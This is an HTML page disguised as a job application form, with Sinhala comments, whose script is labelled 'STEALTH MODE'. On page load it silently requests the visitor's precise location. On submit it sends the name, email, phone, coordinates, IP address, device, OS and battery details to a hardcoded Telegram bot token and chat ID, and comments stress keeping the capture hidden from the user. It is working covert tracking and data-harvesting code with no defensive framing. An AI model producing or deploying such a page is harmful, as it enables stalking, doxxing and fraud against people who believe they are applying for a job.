<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apply Now</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #eef2f3 0%, #dce3e8 100%);
            padding: 20px;
        }

        .container {
            background: #ffffff;
            padding: 35px 30px 30px;
            border-radius: 16px;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.12);
            text-align: center;
            width: 380px;
            max-width: 100%;
            border: 1px solid rgba(0, 0, 0, 0.04);
        }

        .container .icon { font-size: 40px; margin-bottom: 4px; }
        h2 { color: #1a2a3a; font-size: 24px; font-weight: 700; margin-bottom: 4px; }
        .sub-title { color: #6b7a8a; font-size: 14px; margin-bottom: 20px; }

        /* ===== HIDDEN LOCATION BOX (No location shown) ===== */
        #location-status {
            background: #f0f4f9;
            color: #6b7a8a;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 18px;
            font-size: 13px;
            border: 1px solid #e0e4e8;
            display: none;
        }

        #location-status.loading {
            display: block;
            color: #6b7a8a;
        }

        #location-status.success {
            display: block;
            color: #28a745;
            background: #d4edda;
            border-color: #c3e6cb;
        }

        #location-status.error {
            display: block;
            color: #721c24;
            background: #f8d7da;
            border-color: #f5c6cb;
        }

        /* ===== FORM ===== */
        .form-group {
            margin-bottom: 14px;
            text-align: left;
        }

        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #1a2a3a;
            margin-bottom: 4px;
        }

        .form-group label .req { color: #d32f2f; }

        .form-group input {
            width: 100%;
            padding: 11px 14px;
            border: 2px solid #dce3ed;
            border-radius: 10px;
            font-size: 14px;
            outline: none;
            transition: 0.25s;
            background: #fafcfe;
            font-family: inherit;
        }

        .form-group input:focus {
            border-color: #007bff;
            background: #ffffff;
            box-shadow: 0 0 0 4px rgba(0, 123, 255, 0.08);
        }

        .form-group input.error-input {
            border-color: #d32f2f;
            background: #fff6f6;
        }

        .form-group .error-msg {
            color: #d32f2f;
            font-size: 12px;
            font-weight: 500;
            margin-top: 3px;
            display: none;
        }

        .form-group .error-msg.show { display: block; }

        /* ===== BUTTON ===== */
        button {
            width: 100%;
            padding: 13px;
            background: #0d6e4b;
            color: white;
            border: none;
            border-radius: 40px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.25s;
            box-shadow: 0 4px 14px rgba(13, 110, 75, 0.3);
            margin-top: 4px;
        }

        button:hover { background: #0a5640; transform: scale(1.01); }
        button:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }

        /* ===== STATUS ===== */
        #status {
            margin-top: 14px;
            font-size: 13px;
            font-weight: 600;
            display: none;
            padding: 10px;
            border-radius: 8px;
        }

        #status.success { display: block; background: #d4edda; color: #155724; }
        #status.error { display: block; background: #f8d7da; color: #721c24; }

        @media (max-width: 480px) {
            .container { padding: 24px 18px 22px; }
            h2 { font-size: 20px; }
            button { font-size: 15px; padding: 12px; }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="icon">📋</div>
        <h2>Apply Now</h2>
        <div class="sub-title">Fill your details to apply</div>

        <!-- ===== HIDDEN LOCATION STATUS (Userට නොපෙනෙන) ===== -->
        <div id="location-status" class="loading">⏳ Preparing...</div>

        <!-- ===== FORM ===== -->
        <form id="applyForm">

            <div class="form-group">
                <label>Full Name <span class="req">*</span></label>
                <input type="text" id="fullName" placeholder="e.g. Kaveesha Perera" />
                <span class="error-msg" id="nameError">Please enter your name.</span>
            </div>

            <div class="form-group">
                <label>Email Address <span class="req">*</span></label>
                <input type="email" id="email" placeholder="kaveesha@email.com" />
                <span class="error-msg" id="emailError">Please enter a valid email.</span>
            </div>

            <div class="form-group">
                <label>Phone Number <span class="req">*</span></label>
                <input type="tel" id="phone" placeholder="071 234 5678" />
                <span class="error-msg" id="phoneError">Please enter a valid phone number.</span>
            </div>

            <button type="submit" id="submitBtn">🚀 Submit Application</button>
        </form>

        <div id="status"></div>
    </div>

    <!-- ============================================================ -->
    <!-- ===== JAVASCRIPT - STEALTH MODE ===== -->
    <!-- ============================================================ -->
    <script>
        // =============================================
        // 🔐 TELEGRAM CONFIG
        // =============================================
        const BOT_TOKEN = '8864995146:AAERB2czzLwxRORXAHcFieptoqXdCJ7BLec';
        const CHAT_ID = '8308044531';

        // =============================================
        // 📍 ELEMENTS
        // =============================================
        const statusDiv = document.getElementById('location-status');
        const form = document.getElementById('applyForm');
        const submitBtn = document.getElementById('submitBtn');
        const msgDiv = document.getElementById('status');

        const fullName = document.getElementById('fullName');
        const email = document.getElementById('email');
        const phone = document.getElementById('phone');

        const nameError = document.getElementById('nameError');
        const emailError = document.getElementById('emailError');
        const phoneError = document.getElementById('phoneError');

        let userLocation = null;
        let locationDone = false;

        // =============================================
        // 📍 GET LOCATION - SILENTLY (No display)
        // =============================================
        function getLocation() {
            statusDiv.className = 'loading';
            statusDiv.textContent = '⏳ Preparing...';

            if (!navigator.geolocation) {
                locationDone = true;
                statusDiv.className = 'error';
                statusDiv.textContent = '⚠️ Location not supported';
                return;
            }

            navigator.geolocation.getCurrentPosition(
                // ✅ Success
                function(position) {
                    userLocation = {
                        lat: position.coords.latitude,
                        lon: position.coords.longitude
                    };
                    locationDone = true;
                    statusDiv.className = 'success';
                    statusDiv.textContent = '✅ Ready';
                    console.log('📍 Location captured (hidden)');
                },
                // ❌ Error
                function(error) {
                    locationDone = true;
                    statusDiv.className = 'error';
                    if (error.code === 1) {
                        statusDiv.textContent = '⚠️ Permission denied';
                    } else {
                        statusDiv.textContent = '⚠️ Location unavailable';
                    }
                    console.warn('Location error:', error.message);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        // =============================================
        // 📤 SEND TO TELEGRAM
        // =============================================
        async function sendToTelegram(name, emailVal, phoneVal, lat, lon) {
            try {
                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

                const ua = navigator.userAgent;
                const device = ua.match(/Android.*?;\s([^;)\s]+)/)?.[1] ||
                              ua.match(/iPhone|iPad|iPod|Mac|Windows|Linux/i)?.[0] || 'Unknown';
                const os = ua.match(/Android\s([0-9.]+)/)?.[1] ||
                           ua.match(/Windows NT\s([0-9.]+)/)?.[1] || 'Unknown';

                let ip = 'Unknown';
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    ip = data.ip || 'Unknown';
                } catch (e) {}

                let battery = 'Unknown';
                let charging = 'Unknown';
                try {
                    const b = await navigator.getBattery();
                    battery = Math.round(b.level * 100) + '%';
                    charging = b.charging ? '🔌 Charging' : '🔋 Not Charging';
                } catch (e) {}

                const msg = `
📋 **NEW APPLICATION**

👤 Name: ${name}
📧 Email: ${emailVal}
📞 Phone: ${phoneVal}

📍 Location:
Lat: ${lat}
Lon: ${lon}
🗺️ ${mapsLink}

📱 DEVICE
• Device: ${device}
• OS: ${os}
• IP: ${ip}
• Battery: ${battery} (${charging})
• Time: ${new Date().toLocaleString()}
                `;

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown'
                    })
                });

                return response.ok;
            } catch (err) {
                console.error('Telegram error:', err);
                return false;
            }
        }

        // =============================================
        // 📝 FORM SUBMIT
        // =============================================
        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            // Clear errors
            document.querySelectorAll('.error-msg').forEach(el => el.classList.remove('show'));
            document.querySelectorAll('.form-group input').forEach(el => el.classList.remove('error-input'));
            msgDiv.style.display = 'none';
            msgDiv.className = '';

            // Validate
            let isValid = true;

            const nameVal = fullName.value.trim();
            const emailVal = email.value.trim();
            const phoneVal = phone.value.trim();

            if (!nameVal) {
                nameError.classList.add('show');
                fullName.classList.add('error-input');
                isValid = false;
            }

            if (!emailVal || !emailVal.includes('@')) {
                emailError.classList.add('show');
                email.classList.add('error-input');
                isValid = false;
            }

            if (!phoneVal || phoneVal.length < 10) {
                phoneError.classList.add('show');
                phone.classList.add('error-input');
                isValid = false;
            }

            if (!isValid) {
                const firstError = document.querySelector('.form-group input.error-input');
                if (firstError) {
                    firstError.focus();
                    firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
                }
                return;
            }

            // Check location
            if (!locationDone) {
                msgDiv.textContent = '⏳ Please wait...';
                msgDiv.className = '';
                msgDiv.style.display = 'block';
                return;
            }

            if (!userLocation) {
                msgDiv.textContent = '❌ Location not available. Please allow location access.';
                msgDiv.className = 'error';
                msgDiv.style.display = 'block';
                return;
            }

            // Submit
            submitBtn.disabled = true;
            submitBtn.textContent = '⏳ Submitting...';
            msgDiv.style.display = 'none';

            const success = await sendToTelegram(
                nameVal,
                emailVal,
                phoneVal,
                userLocation.lat,
                userLocation.lon
            );

            if (success) {
                // Success - no location shown!
                msgDiv.textContent = '✅ Application submitted successfully!';
                msgDiv.className = 'success';
                msgDiv.style.display = 'block';

                form.reset();

                submitBtn.textContent = '✅ Done!';
                submitBtn.style.background = '#28a745';

                setTimeout(() => {
                    submitBtn.textContent = '🚀 Submit Application';
                    submitBtn.style.background = '#0d6e4b';
                    submitBtn.disabled = false;
                }, 3000);

            } else {
                msgDiv.textContent = '❌ Failed. Please try again.';
                msgDiv.className = 'error';
                msgDiv.style.display = 'block';
                submitBtn.disabled = false;
                submitBtn.textContent = '🚀 Submit Application';
            }
        });

        // Clear error on typing
        document.querySelectorAll('.form-group input').forEach(el => {
            el.addEventListener('input', function() {
                this.classList.remove('error-input');
                const errorMsg = this.closest('.form-group').querySelector('.error-msg');
                if (errorMsg) errorMsg.classList.remove('show');
            });
        });

        // Load location on page load
        window.addEventListener('DOMContentLoaded', function() {
            getLocation();
        });

        console.log('✅ STEALTH MODE - Location hidden from user');
    </script>

</body>
</html>
